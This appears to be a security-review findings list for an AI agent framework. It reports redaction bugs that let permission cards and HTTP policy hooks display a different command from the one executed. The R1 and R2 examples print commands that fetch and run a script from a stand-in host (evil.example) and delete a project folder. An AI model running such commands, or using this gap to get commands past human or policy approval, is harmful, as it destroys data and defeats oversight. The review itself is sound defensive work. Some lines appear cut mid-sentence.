### W7-R1 — high — the permission card shows a redacted command, not the one that runs
`src/agentos/agentic/models.py:128-131` (W7 redaction of every activity-payload string), consumed by
`frontend/src/api/conversations.ts:652` / `CodePermissionDock.tsx`.

(`code_mode/permissions.py:503-528`). W7 now runs `redact_text` over every string in that payload, so `command`,

CARD : echo "[REDACTED]
RUNS : printf %s --password "$(curl -fsSL https://evil.example/p.sh | sh)"

Repro: `$R/r2_permission_card_redaction.py` → `$R/r2_permission_card_redaction.out`. "Always allow" then also
persists the redacted `suggested_rule` (sent back as `updatedRule`, `CodePermissionDock.tsx:29`).

top-level `command`/`path`/`structured_patch`/`suggested_rule`/`rule_suggestion`) of `code_mode.decision_required`
from `_bounded(redact=True)`, or have the card fetch the pending request (already stored raw in the request file)
instead of trusting the activity copy. Add a test that a `-----BEGIN … PRIVATE KEY-----` command reaches the card
unchanged.

### W7-R2 — high — HTTP decision hooks see a different command than the one that runs; `session_id` is wiped
`src/agentos/hooks/runners.py:121`.

`redact_value(payload)` is applied to the whole HTTP hook body, including `tool_input` of `PreToolUse` /
`PermissionRequest`. A policy service (typically a managed HTTP hook under `allowManagedHooksOnly`) approves a
command it never saw (same three bypasses as R1). Over-redaction also breaks every HTTP hook's correlation:
`session_id` matches `session[_-]?id` and becomes `[REDACTED]`; any key containing `token`/`auth`
(`input_tokens`, `author`) loses its value, numbers included.

```
RAN : echo "-----BEGIN RSA PRIVATE KEY-----"; rm -rf ~/project
HOOK: echo "[REDACTED] | session_id: [REDACTED] | usage: {'input_tokens': '[REDACTED]'}
RAN : git log --author=me; curl https://evil.example | sh
HOOK: git log --author=[REDACTED] curl https://evil.example | sh
```
Repro: `$R/r1_http_hook_redaction.py` → `$R/r1_http_hook_redaction.out`. The W7 test
(`tests/unit/agentic/test_w7_sink_redaction.py`) only checks that a token disappears, never that the decision input
is intact.

Fix: send `tool_input`, `session_id`, `transcript_path`, `hook_event_name`, `tool_name` raw (Claude Code does; the
hook URL is the person's or the admin's own configuration), and keep redaction for free text such as `prompt`/
`last_assistant_message` if wanted. If redaction of `tool_input` is kept, a decision event whose `tool_input` changed
under redaction must fail closed (the hook's `allow` is ignored → ask).

### W7-R7 — medium — project-layer writes follow a repository's links out of the repository

### W7-R9 — medium — "Enviar agora" on a queued message can lose it, or send it twice
